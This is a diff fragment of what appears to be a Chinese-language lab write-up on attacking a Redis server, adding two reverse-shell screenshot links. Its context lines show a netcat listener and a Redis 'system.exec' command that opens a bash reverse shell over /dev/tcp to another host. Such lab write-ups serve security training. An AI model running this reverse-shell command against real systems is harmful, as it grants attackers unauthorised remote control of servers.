@@ -117,9 +117,9 @@ nc -lvnp 4444
 redis-cli -h 10.165.15.225 -p 6379
 system.exec "bash -c 'bash -i >& /dev/tcp/10.165.15.22/4444 0>&1'"
 ```
+![反弹1](images/8.png)
 
-
-
+![反弹2](images/9.png)
 
 
 ## 销毁靶场
